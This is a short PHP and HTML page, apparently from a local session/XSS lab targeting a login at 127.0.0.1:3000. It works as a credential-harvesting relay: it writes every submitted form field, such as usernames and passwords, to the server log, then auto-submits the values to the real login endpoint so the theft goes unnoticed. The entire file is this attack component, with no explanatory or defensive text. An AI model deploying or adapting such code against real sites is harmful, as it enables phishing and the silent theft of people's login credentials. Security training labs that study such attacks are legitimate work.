<form id="redirectForm" action="http://127.0.0.1:3000/sessionxss/login" method="post">
<?php
    foreach ($_POST as $a => $b) {
	    echo '<input type="hidden" name="'.htmlentities($a).'" value="'.htmlentities($b).'">';
	    error_log("[PHP] ".htmlentities($a)." : ".htmlentities($b),0);
    }
?>
</form>
<script type="text/javascript">
    document.getElementById('redirectForm').submit();
</script>
